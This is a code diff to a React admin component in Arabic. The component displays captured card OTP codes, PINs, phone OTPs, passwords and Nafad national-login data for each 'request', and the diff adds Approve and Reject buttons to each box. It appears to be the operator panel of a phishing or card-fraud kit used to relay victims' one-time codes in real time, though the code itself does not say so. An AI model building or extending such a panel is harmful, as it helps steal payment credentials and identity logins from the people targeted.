@@ -1643,11 +1643,6 @@ const renderNafadBox = () => {
     // Get latest data for each type
     const basicRaw = getLatestRawForBox('basic') || selectedRequest?.raw || {};
     const insuranceRaw = getLatestRawForBox('insurance') || selectedRequest?.raw || {};
-    const paymentStatus = getPaymentStatus();
-    const cardOtpStatus = getCardOtpStatus();
-    const pinStatus = getPinStatus();
-    const phoneOtpStatus = getPhoneOtpStatus();
-    const nafadStatus = getNafadStatus();
     
     // Get OTP codes - use sample data for demo
     const cardOtpCode = selectedRequest?.raw?._v5 || selectedRequest?.raw?.otpCode || "123456";
@@ -1731,6 +1726,19 @@ const renderNafadBox = () => {
               <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{insuranceRaw?.repairLocation === "agency" ? "الوكالة" : (insuranceRaw?.repairLocation || "الوكالة")}</span>
             </div>
           </div>
+          {/* أزرار الموافقة والرفض */}
+          <div style={{ display: "flex", gap: 8, marginTop: 12 }}>
+            <button 
+              style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#22c55e", color: "#fff", fontWeight: 700, cursor: "pointer" }}
+            >
+              ✅ موافق
+            </button>
+            <button 
+              style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#ef4444", color: "#fff", fontWeight: 700, cursor: "pointer" }}
+            >
+              ❌ مرفوض
+            </button>
+          </div>
         </div>
 
         {/* صندوق بيانات الدفع */}
@@ -1747,8 +1755,18 @@ const renderNafadBox = () => {
             <span style={{ fontSize: "1.2rem" }}>💳</span>
             <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>صندوق بيانات الدفع</h3>
           </div>
-          <div style={{ background: "#dcfce7", borderRadius: 8, padding: 12, border: "1px solid #86efac", textAlign: "center" }}>
-            <p style={{ margin: 0, fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>✅ موافق</p>
+          {/* أزرار الموافقة والرفض */}
+          <div style={{ display: "flex", gap: 8, marginTop: 8 }}>
+            <button 
+              style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#22c55e", color: "#fff", fontWeight: 700, cursor: "pointer" }}
+            >
+              ✅ موافق
+            </button>
+            <button 
+              style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#ef4444", color: "#fff", fontWeight: 700, cursor: "pointer" }}
+            >
+              ❌ مرفوض
+            </button>
           </div>
         </div>
 
@@ -1770,8 +1788,18 @@ const renderNafadBox = () => {
             <p style={{ margin: "0 0 4px", fontSize: "0.75rem", color: "#0369a1" }}>رمز التحقق المُدخل:</p>
             <p style={{ margin: 0, fontSize: "1.5rem", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.3em" }}>{cardOtpCode}</p>
           </div>
-          <div style={{ marginTop: 8, background: "#dcfce7", borderRadius: 8, padding: 8, textAlign: "center" }}>
-            <p style={{ margin: 0, fontSize: "0.8rem", color: "#166534", fontWeight: 600 }}>✅ موافق</p>
+          {/* أزرار الموافقة والرفض */}
+          <div style={{ display: "flex", gap: 8, marginTop: 12 }}>
+            <button 
+              style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#22c55e", color: "#fff", fontWeight: 700, cursor: "pointer" }}
+            >
+              ✅ موافق
+            </button>
+            <button 
+              style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#ef4444", color: "#fff", fontWeight: 700, cursor: "pointer" }}
+            >
+              ❌ مرفوض
+            </button>
           </div>
         </div>
 
@@ -1796,8 +1824,18 @@ const renderNafadBox = () => {
               </div>
             ))}
           </div>
-          <div style={{ marginTop: 8, background: "#dcfce7", borderRadius: 8, padding: 8, textAlign: "center" }}>
-            <p style={{ margin: 0, fontSize: "0.8rem", color: "#166534", fontWeight: 600 }}>✅ موافق</p>
+          {/* أزرار الموافقة والرفض */}
+          <div style={{ display: "flex", gap: 8, marginTop: 12 }}>
+            <button 
+              style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#22c55e", color: "#fff", fontWeight: 700, cursor: "pointer" }}
+            >
+              ✅ موافق
+            </button>
+            <button 
+              style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#ef4444", color: "#fff", fontWeight: 700, cursor: "pointer" }}
+            >
+              ❌ مرفوض
+            </button>
           </div>
         </div>
 
@@ -1822,8 +1860,18 @@ const renderNafadBox = () => {
           <div style={{ marginTop: 8, background: "#f0f9ff", borderRadius: 8, padding: 12, textAlign: "center" }}>
             <p style={{ margin: 0, fontSize: "1.2rem", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.2em" }}>{phoneOtpCode}</p>
           </div>
-          <div style={{ marginTop: 8, background: "#dcfce7", borderRadius: 8, padding: 8, textAlign: "center" }}>
-            <p style={{ margin: 0, fontSize: "0.8rem", color: "#166534", fontWeight: 600 }}>✅ موافق</p>
+          {/* أزرار الموافقة والرفض */}
+          <div style={{ display: "flex", gap: 8, marginTop: 12 }}>
+            <button 
+              style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#22c55e", color: "#fff", fontWeight: 700, cursor: "pointer" }}
+            >
+              ✅ موافق
+            </button>
+            <button 
+              style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#ef4444", color: "#fff", fontWeight: 700, cursor: "pointer" }}
+            >
+              ❌ مرفوض
+            </button>
           </div>
         </div>
 
@@ -1849,8 +1897,18 @@ const renderNafadBox = () => {
             <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>كلمة المرور</span>
             <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>••••••</span>
           </div>
-          <div style={{ marginTop: 8, background: "#dcfce7", borderRadius: 8, padding: 8, textAlign: "center" }}>
-            <p style={{ margin: 0, fontSize: "0.8rem", color: "#166534", fontWeight: 600 }}>✅ موافق</p>
+          {/* أزرار الموافقة والرفض */}
+          <div style={{ display: "flex", gap: 8, marginTop: 12 }}>
+            <button 
+              style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#22c55e", color: "#fff", fontWeight: 700, cursor: "pointer" }}
+            >
+              ✅ موافق
+            </button>
+            <button 
+              style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#ef4444", color: "#fff", fontWeight: 700, cursor: "pointer" }}
+            >
+              ❌ مرفوض
+            </button>
           </div>
         </div>
 
